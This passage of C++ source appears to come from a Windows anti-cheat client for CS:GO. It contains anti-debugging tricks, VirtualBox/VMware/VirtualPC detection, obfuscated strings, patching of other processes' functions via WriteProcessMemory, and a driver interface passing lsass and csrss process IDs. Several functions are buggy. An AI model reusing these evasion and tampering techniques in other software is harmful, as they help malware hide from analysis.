			if (IsDbgPresentPrefixCheck())
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#10 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			unsigned long pnsize = 0x1000;
			char* provider = (char*)LocalAlloc(LMEM_ZEROINIT, pnsize);
			int retv = WNetGetProviderName(WNNC_NET_RDR2SAMPLE, provider, &pnsize);
			if (retv == NO_ERROR)
			{
				char Debug1[] = "X⌂d{+oni~llbel+{ydlyjf*";
				Encrypt(Debug1, sizeof(Debug1));
				DWORD ClientAddress;
				if (lstrcmpi(provider, "VirtualBox Shared Folders") == 0)
				{
					MessageBox(0, Debug1, "waliedassar", 0);
					char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
					Encrypt(ntdll1, sizeof(ntdll1));
					char* begin1 = ntdll1;   // Points to string beggining
					char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
					std::replace(begin1, end1, '4', 't');
					char ntdll[] = "hxld%nsn";
					Encrypt(ntdll, sizeof(ntdll));
					GetProcId(ntdll);
					MessageBox(NULL, "#9 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
					Sleep(30);
					exit(1);
				}
			}
			if (ModuleCheck())
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#8 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			BOOL vpc = false;
			sgdt();
			sldt();
			str();
			smsw();
			vmware_get_memory();
			vmware_get_version();
			vpc = virtualpc_detect();
			if (vpc)
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#80 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			else
			{

			}
		}
}

#define MAX_PROCESSES 1024 
DWORD FindProcessId(__in_z LPCTSTR lpcszFileName)
{
	LPDWORD lpdwProcessIds;
	LPTSTR  lpszBaseName;
	HANDLE  hProcess;
	DWORD   i, cdwProcesses, dwProcessId = 0;

	lpdwProcessIds = (LPDWORD)HeapAlloc(GetProcessHeap(), 0, MAX_PROCESSES * sizeof(DWORD));
	if (lpdwProcessIds != NULL)
	{
		if (EnumProcesses(lpdwProcessIds, MAX_PROCESSES * sizeof(DWORD), &cdwProcesses))
		{
			lpszBaseName = (LPTSTR)HeapAlloc(GetProcessHeap(), 0, MAX_PATH * sizeof(TCHAR));
			if (lpszBaseName != NULL)
			{
				cdwProcesses /= sizeof(DWORD);
				for (i = 0; i < cdwProcesses; i++)
				{
					hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lpdwProcessIds[i]);
					if (hProcess != NULL)
					{
						if (GetModuleBaseName(hProcess, NULL, lpszBaseName, MAX_PATH) > 0)
						{
							if (!lstrcmpi(lpszBaseName, lpcszFileName))
							{
								dwProcessId = lpdwProcessIds[i];
								CloseHandle(hProcess);
								break;
							}
						}
						CloseHandle(hProcess);
					}
				}
				HeapFree(GetProcessHeap(), 0, (LPVOID)lpszBaseName);
			}
		}
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpdwProcessIds);
	}
	return dwProcessId;
}

int csgonumber = 0;
int csgoPrintModules()
{
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	unsigned int i;

	// Print the process identifier.


	// Get a handle to the process.

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, FindProcessId("csgo.exe"));
	if (NULL == hProcess)
		return 1;

	// Get a list of all the modules in this process.

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{

		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];

			// Get the full path to the module's file.

			if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
				sizeof(szModName) / sizeof(TCHAR)))
			{
				// Print the module name and handle value.
				//_tprintf(TEXT("\t%s (0x%08X)\n"), szModName, hMods[i]);
				csgonumber++;
				return csgonumber;
			}
		}
	}

	// Release the handle to the process.

	CloseHandle(hProcess);

	return 0;
}

int csgoCurNumb = 0;
void CheckMoudleCSGO()
{

	DWORD aProcesses[1024];
	DWORD cbNeeded;
	DWORD cProcesses;
	unsigned int i;

	// Get the list of process identifiers.

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#8 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}

	// Calculate how many process identifiers were returned.

	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the names of the modules for each process.

	for (i = 0; i < cProcesses; i++)
	{
		csgoCurNumb = csgoPrintModules();
	}
	while (1)
	{
		int RuntimeNum;
		DWORD aProcesses[1024];
		DWORD cbNeeded;
		DWORD cProcesses;
		unsigned int i;

		// Get the list of process identifiers.

		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
			Encrypt(ntdll1, sizeof(ntdll1));
			char* begin1 = ntdll1;   // Points to string beggining
			char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
			std::replace(begin1, end1, '4', 't');
			char ntdll[] = "hxld%nsn";
			Encrypt(ntdll, sizeof(ntdll));
			GetProcId(ntdll);
			MessageBox(NULL, "#7 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
			Sleep(30);
			exit(1);
		}

		// Calculate how many process identifiers were returned.

		cProcesses = cbNeeded / sizeof(DWORD);

		// Print the names of the modules for each process.

		for (i = 0; i < cProcesses; i++)
		{
			RuntimeNum = csgoPrintModules();
		}
		cout << RuntimeNum << endl;
		Sleep(300);
	}

}

int number = 0;
int PrintModules(DWORD processID)
{
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	unsigned int i;
	int LOL;
	LOL = 0;

	// Print the process identifier.

	//printf("\nProcess ID: %u\n", processID);

	// Get a handle to the process.

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);
	if (NULL == hProcess)
		exit(1);

	// Get a list of all the modules in this process.

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];

			// Get the full path to the module's file.

			if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
				sizeof(szModName) / sizeof(TCHAR)))
			{
				// Print the module name and handle value.
				LOL++;
				//_tprintf(TEXT("\t%s (0x%08X)\n"), szModName, hMods[i]);
			}
		}
	}
	return LOL;
	// Release the handle to the process.

	CloseHandle(hProcess);

}

long GetFileSize(std::string filename)
{
	struct stat stat_buf;
	int rc = stat(filename.c_str(), &stat_buf);
	return rc == 0 ? stat_buf.st_size : -1;
}

int CurNumb = 0;
void CheckMoudles()
{

	DWORD aProcesses[1024];
	DWORD cbNeeded;
	DWORD cProcesses;
	unsigned int i;

	// Get the list of process identifiers.

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#6 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}

	// Calculate how many process identifiers were returned.

	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the names of the modules for each process.

	for (i = 0; i < cProcesses; i++)
	{
		CurNumb = PrintModules(aProcesses[i]);
	}
	while (1)
	{
		int RuntimeNum;
		DWORD aProcesses[1024];
		DWORD cbNeeded;
		DWORD cProcesses;
		unsigned int i;

		// Get the list of process identifiers.

		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
			Encrypt(ntdll1, sizeof(ntdll1));
			char* begin1 = ntdll1;   // Points to string beggining
			char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
			std::replace(begin1, end1, '4', 't');
			char ntdll[] = "hxld%nsn";
			Encrypt(ntdll, sizeof(ntdll));
			GetProcId(ntdll);
			MessageBox(NULL, "#5 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
			Sleep(30);
			exit(1);
		}

		// Calculate how many process identifiers were returned.

		cProcesses = cbNeeded / sizeof(DWORD);

		// Print the names of the modules for each process.

		for (i = 0; i < cProcesses; i++)
		{
			RuntimeNum = PrintModules(aProcesses[i]);
		}
		if (RuntimeNum != CurNumb)
		{
			char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
			Encrypt(ntdll1, sizeof(ntdll1));
			char* begin1 = ntdll1;   // Points to string beggining
			char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
			std::replace(begin1, end1, '4', 't');
			char ntdll[] = "hxld%nsn";
			Encrypt(ntdll, sizeof(ntdll));
			GetProcId(ntdll);
			MessageBox(NULL, "#4 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
			Sleep(30);
			exit(1);
		}
		Sleep(300);
	}

}

bool fileExists(const char* filename)
{
	ifstream infile(filename);
	return (bool)infile;
}

DWORD GetModuleBaseCheat(LPSTR lpModuleName, int *sizeOut)
{

	MODULEENTRY32 lpModuleEntry = { 0 };
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, proccesId);
	if (!hSnapShot)
		return NULL;
	lpModuleEntry.dwSize = sizeof(lpModuleEntry);
	BOOL bModule = Module32First(hSnapShot, &lpModuleEntry);
	while (bModule)
	{
		if (isInCharString(lpModuleEntry.szModule, lpModuleName))
		{

			CloseHandle(hSnapShot);
			*sizeOut = lpModuleEntry.modBaseSize;
			return (DWORD)lpModuleEntry.modBaseAddr;
		}
		bModule = Module32Next(hSnapShot, &lpModuleEntry);
	}
	CloseHandle(hSnapShot);
	return NULL;
}

void CheckDLLs()
{
	HideFromDebugger();
	while (1)
	{
		DWORD clientModuleBase1;
		int engineModuleSize1;

		DWORD clientModuleBase2;
		int engineModuleSize2;
		
		DWORD clientModuleBase3;
		int engineModuleSize3;

		char ntdll22[] = "hcnj⌂";
		Encrypt(ntdll22, sizeof(ntdll22));
		char* begin12 = ntdll22;   // Points to string beggining
		char* end12 = ntdll22 + strlen(ntdll22); // Points to string end
		std::replace(begin12, end12, '4', 't');

		if ((clientModuleBase1 = GetModuleBase(ntdll22, &engineModuleSize1)) == NULL)
		{
			Sleep(30);
		}
		else
		{
			char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
			Encrypt(ntdll1, sizeof(ntdll1));
			char* begin1 = ntdll1;   // Points to string beggining
			char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
			std::replace(begin1, end1, '4', 't');
			char ntdll[] = "hxld%nsn";
			Encrypt(ntdll, sizeof(ntdll));
			GetProcId(ntdll);
			MessageBox(NULL, "#1 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
			Sleep(30);
			exit(1);
		}

		char ntdll32[] = "|jyn";
		Encrypt(ntdll32, sizeof(ntdll32));
		char* begin21 = ntdll32;   // Points to string beggining
		char* end21 = ntdll32 + strlen(ntdll32); // Points to string end
		std::replace(begin21, end21, '4', 't');

		if ((clientModuleBase2 = GetModuleBase(ntdll32, &engineModuleSize2)) == NULL)
		{
			Sleep(30);
		}
		else
		{
			char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
			Encrypt(ntdll1, sizeof(ntdll1));
			char* begin1 = ntdll1;   // Points to string beggining
			char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
			std::replace(begin1, end1, '4', 't');
			char ntdll[] = "hxld%nsn";
			Encrypt(ntdll, sizeof(ntdll));
			GetProcId(ntdll);
			MessageBox(NULL, "#2 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
			Sleep(30);
			exit(1);
		}
		char ntdll3[] = "cjh`";
		Encrypt(ntdll3, sizeof(ntdll3));
		char* begin3 = ntdll3;   // Points to string beggining
		char* end3 = ntdll3 + strlen(ntdll3); // Points to string end
		std::replace(begin3, end3, '4', 't');
		if ((clientModuleBase3 = GetModuleBase(ntdll3, &engineModuleSize3)) == NULL)
		{
			Sleep(30);
		}
		else
		{
			char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
			Encrypt(ntdll1, sizeof(ntdll1));
			char* begin1 = ntdll1;   // Points to string beggining
			char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
			std::replace(begin1, end1, '4', 't');
			char ntdll[] = "hxld%nsn";
			Encrypt(ntdll, sizeof(ntdll));
			GetProcId(ntdll);
			MessageBox(NULL, "#3 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
			Sleep(30);
			exit(1);
		}
	}
}

void Exit()
{
	char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
	Encrypt(ntdll1, sizeof(ntdll1));
	char* begin1 = ntdll1;   // Points to string beggining
	char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
	std::replace(begin1, end1, '4', 't');
	char ntdll[] = "hxld%nsn";
	Encrypt(ntdll, sizeof(ntdll));
	GetProcId(ntdll);
	Sleep(30);
	exit(1);
}

std::string getexepath()
{
	char result[MAX_PATH];
	return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
}

void printError(TCHAR* msg)
{
	DWORD eNum;
	TCHAR sysMsg[256];
	TCHAR* p;

	eNum = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, eNum,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		sysMsg, 256, NULL);

	// Trim the end of the line and terminate it with a null
	p = sysMsg;
	while ((*p > 31) || (*p == 9))
		++p;
	do { *p-- = 0; } while ((p >= sysMsg) &&
		((*p == '.') || (*p < 33)));

	// Display the message
}

int ListProcessThreads()
{
	int i = 0;
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take a snapshot of all running threads  
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (!Thread32First(hThreadSnap, &te32))
	{
		CloseHandle(hThreadSnap);     // Must clean up the snapshot object!
		return(FALSE);
	}

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	do
	{
		if (te32.th32OwnerProcessID == GetCurrentProcessId())
		{
			i++;
		}
	} while (Thread32Next(hThreadSnap, &te32));


	//  Don't forget to clean up the snapshot object.
	CloseHandle(hThreadSnap);
	return i;
}

BOOLEAN BlockAPI(HANDLE hProcess, CHAR *libName, CHAR *apiName)
{
	CHAR pRet[] = { 0xC3 };
	HINSTANCE hLib = NULL;
	VOID *pAddr = NULL;
	BOOL bRet = FALSE;
	DWORD dwRet = 0;

	hLib = LoadLibrary(libName);
	if (hLib) {
		pAddr = (VOID*)GetProcAddress(hLib, apiName);
		if (pAddr) {
			if (WriteProcessMemory(hProcess,
				(LPVOID)pAddr,
				(LPVOID)pRet,
				sizeof(pRet),
				&dwRet)) {
				if (dwRet) {
					bRet = TRUE;
				}
			}
		}
		FreeLibrary(hLib);
	}
	return bRet;
}

void AntiInject()
{
	cout << "test" << endl;
}

void hexdump(void *pAddressIn, long  lSize)
{
	char szBuf[100];
	long lIndent = 1;
	long lOutLen, lIndex, lIndex2, lOutLen2;
	long lRelPos;
	struct { char *pData; unsigned long lSize; } buf;
	unsigned char *pTmp, ucTmp;
	unsigned char *pAddress = (unsigned char *)pAddressIn;

	buf.pData = (char *)pAddress;
	buf.lSize = lSize;

	while (buf.lSize > 0)
	{
		pTmp = (unsigned char *)buf.pData;
		lOutLen = (int)buf.lSize;
		if (lOutLen > 16)
			lOutLen = 16;

		// create a 64-character formatted output line:
		sprintf(szBuf, " >                            "
			"                      "
			"    %08lX", pTmp - pAddress);
		lOutLen2 = lOutLen;

		for (lIndex = 1 + lIndent, lIndex2 = 53 - 15 + lIndent, lRelPos = 0;
			lOutLen2;
			lOutLen2--, lIndex += 2, lIndex2++
			)
		{
			ucTmp = *pTmp++;

			sprintf(szBuf + lIndex, "%02X ", (unsigned short)ucTmp);
			if (!isprint(ucTmp))  ucTmp = '.'; // nonprintable char
			szBuf[lIndex2] = ucTmp;

			if (!(++lRelPos & 3))     // extra blank after 4 bytes
			{
				lIndex++; szBuf[lIndex + 2] = ' ';
			}
		}

		if (!(lRelPos & 3)) lIndex--;

		szBuf[lIndex] = '<';
		szBuf[lIndex + 1] = ' ';

		printf("%s\n", szBuf);

		buf.pData += lOutLen;
		buf.lSize -= lOutLen;
	}
}

//getOutputFilePathNextToPath function - returns the output file path next to the given parameter inputPath
// with the same name but the extension .dmp
string getOutputFilePathNextToPath1(string inputPath)
{
	size_t found = inputPath.find_last_of("/\\");
	string outputPath = inputPath.substr(0, found) + "\\";  //append a back slash to the end of the path
	string outputName = inputPath.substr(found + 1);

	if (outputName.find(".")) // file name has extension
	{
		//strip off the extension and add .dmp
		size_t period = outputName.find_last_of(".");
		outputName = outputName.substr(0, period) + ".dmp";
	}
	else {
		//no file extension so just add .dmp
		outputName += ".dmp";
	}

	return outputPath + outputName;
}


//
//fileExists function - a utility function used to check if a file exists
//
bool fileExists1(const char* filename)
{
	ifstream infile(filename);
	return (bool)infile;
}

BOOLEAN BlockAPIEXE(HANDLE hProcess, CHAR *libName, CHAR *apiName)
{
	CHAR pRet[] = { 0xC3 };
	HINSTANCE hLib = NULL;
	VOID *pAddr = NULL;
	BOOL bRet = FALSE;
	DWORD dwRet = 0;

	hLib = LoadLibrary(libName);
	if (hLib) {
		pAddr = (VOID*)GetProcAddress(hLib, apiName);
		if (pAddr) {
			if (WriteProcessMemory(hProcess,
				(LPVOID)pAddr,
				(LPVOID)pRet,
				sizeof(pRet),
				&dwRet)) {
				if (dwRet) {
					bRet = TRUE;
				}
			}
		}
		FreeLibrary(hLib);
	}
	return bRet;
} 

#define MAX_CLASSNAME 255
#define MAX_WNDNAME MAX_CLASSNAME

struct OverlayFinderParams {
	DWORD pidOwner = NULL;
	wstring wndClassName = L"";
	wstring wndName = L"";
	RECT pos = { 0, 0, 0, 0 }; // GetSystemMetrics with SM_CXSCREEN and SM_CYSCREEN can be useful here
	POINT res = { 0, 0 };
	float percentAllScreens = 0.0f;
	float percentMainScreen = 0.0f;
	DWORD style = NULL;
	DWORD styleEx = NULL;
	bool satisfyAllCriteria = false;
	vector<HWND> hwnds;
};

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam);
vector<HWND> OverlayFinder(OverlayFinderParams params);

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam)
{
	OverlayFinderParams& params = *(OverlayFinderParams*)lParam;

	unsigned char satisfiedCriteria = 0, unSatisfiedCriteria = 0;

	// If looking for windows of a specific PDI
	DWORD pid = 0;
	GetWindowThreadProcessId(hwnd, &pid);
	if (params.pidOwner != NULL)
		if (params.pidOwner == pid)
			++satisfiedCriteria; // Doesn't belong to the process targeted
		else
			++unSatisfiedCriteria;

	// If looking for windows of a specific class
	wchar_t className[MAX_CLASSNAME] = L"";
	GetClassName(hwnd, (LPSTR)className, MAX_CLASSNAME);
	wstring classNameWstr = className;
	if (params.wndClassName != L"")
		if (params.wndClassName == classNameWstr)
			++satisfiedCriteria; // Not the class targeted
		else
			++unSatisfiedCriteria;
	// If looking for windows with a specific name
	wchar_t windowName[MAX_WNDNAME] = L"";
	GetWindowText(hwnd, (LPSTR)windowName, MAX_CLASSNAME);
	wstring windowNameWstr = windowName;
	if (params.wndName != L"")
		if (params.wndName == windowNameWstr)
			++satisfiedCriteria; // Not the class targeted
		else
			++unSatisfiedCriteria;

	// If looking for window at a specific position
	RECT pos;
	GetWindowRect(hwnd, &pos);
	if (params.pos.left || params.pos.top || params.pos.right || params.pos.bottom)
		if (params.pos.left == pos.left && params.pos.top == pos.top && params.pos.right == pos.right && params.pos.bottom == pos.bottom)
			++satisfiedCriteria;
		else
			++unSatisfiedCriteria;

	// If looking for window of a specific size
	POINT res = { pos.right - pos.left, pos.bottom - pos.top };
	if (params.res.x || params.res.y)
		if (res.x == params.res.x && res.y == params.res.y)
			++satisfiedCriteria;
		else
			++unSatisfiedCriteria;

	// If looking for windows taking more than a specific percentage of all the screens
	float ratioAllScreensX = res.x / GetSystemMetrics(SM_CXSCREEN);
	float ratioAllScreensY = res.y / GetSystemMetrics(SM_CYSCREEN);
	float percentAllScreens = ratioAllScreensX * ratioAllScreensY * 100;
	if (params.percentAllScreens != 0.0f)
		if (percentAllScreens >= params.percentAllScreens)
			++satisfiedCriteria;
		else
			++unSatisfiedCriteria;
	// If looking for windows taking more than a specific percentage or the main screen
	RECT desktopRect;
	GetWindowRect(GetDesktopWindow(), &desktopRect);
	POINT desktopRes = { desktopRect.right - desktopRect.left, desktopRect.bottom - desktopRect.top };
	float ratioMainScreenX = res.x / desktopRes.x;
	float ratioMainScreenY = res.y / desktopRes.y;
	float percentMainScreen = ratioMainScreenX * ratioMainScreenY * 100;
	if (params.percentMainScreen != 0.0f)
		if (percentAllScreens >= params.percentMainScreen)
			++satisfiedCriteria;
		else
			++unSatisfiedCriteria;

	// Looking for windows with specific styles
	LONG_PTR style = GetWindowLongPtr(hwnd, GWL_STYLE);
	if (params.style)
		if (params.style & style)
			++satisfiedCriteria;
		else
			++unSatisfiedCriteria;

	// Looking for windows with specific extended styles
	LONG_PTR styleEx = GetWindowLongPtr(hwnd, GWL_EXSTYLE);
	if (params.styleEx)
		if (params.styleEx & styleEx)
			++satisfiedCriteria;
		else
			++unSatisfiedCriteria;

	if (!satisfiedCriteria)
		return TRUE;

	if (params.satisfyAllCriteria && unSatisfiedCriteria)
		return TRUE;

	// If looking for multiple windows
	params.hwnds.push_back(hwnd);
	return TRUE;
}

vector<HWND> OverlayFinder(OverlayFinderParams params)
{
	EnumWindows(EnumWindowsCallback, (LPARAM)&params);
	return params.hwnds;
}

// datatype for read request
typedef struct _KERNEL_READ_REQUEST
{
	ULONG CSGO;

	ULONG LSASS;
	ULONG CSRSS;
	ULONG CSRSS2;
	ULONG UsermodeProgram;
	ULONG TerminatePrograms;

} KERNEL_READ_REQUEST, *PKERNEL_READ_REQUEST;

// database for unload details
typedef struct _KERNEL_UNLOADDRIVER
{
	ULONG UnloadDriver;

} KERNEL_UNLOADDRIVER, *PKERNEL_UNLOADDRIVER;

// Request to write to kernel mode
#define IO_READ_REQUEST CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0701 /* Our Custom Code */, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

// Request to write virtual user memory (memory of a program) from kernel space
#define IO_UNLOADDRIVER_REQUEST CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0702 /* Our Custom Code */, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

HANDLE hDriver;
bool SendProcessIDs(ULONG CSGO, ULONG LSASS, ULONG CSRSS, ULONG CSRSS2, ULONG USERMODEANTICHEAT, ULONG TerminatePrograms)
{
	if (hDriver == INVALID_HANDLE_VALUE)
		return false;

	DWORD Return, Bytes;
	KERNEL_READ_REQUEST ReadRequest;

	ReadRequest.CSGO = CSGO;
	ReadRequest.LSASS = LSASS;
	ReadRequest.CSRSS = CSRSS;
	ReadRequest.CSRSS2 = CSRSS2;
	ReadRequest.UsermodeProgram = USERMODEANTICHEAT;
	ReadRequest.TerminatePrograms = TerminatePrograms;

	// send code to our driver with the arguments
	if (DeviceIoControl(hDriver, IO_READ_REQUEST, &ReadRequest,
		sizeof(ReadRequest), &ReadRequest, sizeof(ReadRequest), &Bytes, NULL))
	{
		return true;
	}
	else
	{
		return false;
	}
}

bool UnloadDriver(ULONG Unload)
{
	if (hDriver == INVALID_HANDLE_VALUE)
		return false;

	DWORD Return, Bytes;
	KERNEL_UNLOADDRIVER ReadRequest;

	ReadRequest.UnloadDriver = Unload;


	// send code to our driver with the arguments
	if (DeviceIoControl(hDriver, IO_UNLOADDRIVER_REQUEST, &ReadRequest,
		sizeof(ReadRequest), &ReadRequest, sizeof(ReadRequest), &Bytes, NULL))
	{
		return true;
	}
	else
	{
		return false;
	}
}

void SomeDingWong()
{
	BOOL isDebugged = TRUE;
	__try
	{
		__asm
		{
			pushfd
			or dword ptr[esp], 0x100 // set the Trap Flag 
			popfd                    // Load the value into EFLAGS register
			nop
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		// If an exception has been raised – debugger is not present
		isDebugged = FALSE;
	}
	if (isDebugged)
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#22 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
}

#pragma comment(lib,"ntdll.lib")

// These structures are copied from Process Hacker source code (ntldr.h)

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

vector<DWORD> GetPIDs(wstring targetProcessName)
{
	vector<DWORD> pids;
	if (targetProcessName == L"")
		return pids;
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof entry;
	if (!Process32FirstW(snap, &entry))
		return pids;
	do {
		if (wstring(entry.szExeFile) == targetProcessName) {
			pids.emplace_back(entry.th32ProcessID);
		}
	} while (Process32NextW(snap, &entry));
	return pids;
}
string filePath;
void openFile()
{

	const int SUM_ARR_SZ = 100;
	unsigned int checkSums[SUM_ARR_SZ];
	string fileNames[SUM_ARR_SZ];

	char charArr[100000];

	ifstream inFile;

	inFile.open(filePath.c_str(), ios::binary);
	inFile.seekg(0, ios_base::end);
	int fileLen = inFile.tellg();
	inFile.seekg(0, ios_base::beg);

	inFile.read(charArr, fileLen);

	cout << "File checksum = " << checkSums << endl;

	inFile.close();

	inFile.clear(std::ios_base::goodbit);

}


int main(int argc, char *argv[])
{
	SetDebugPrivA();


	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	ProtectProcess(hProc);
	SetPriorityClass(hProc, ABOVE_NORMAL_PRIORITY_CLASS);
	CloseHandle(hProc);

	HANDLE hDevice;
	DWORD dwReturn;
	DWORD ProcessId, write;

	hDriver = CreateFileA("\\\\.\\SACDriver", GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	DWORD csrss1 = NULL;
	DWORD csrss2 = NULL;
	wstring we1 = L"";
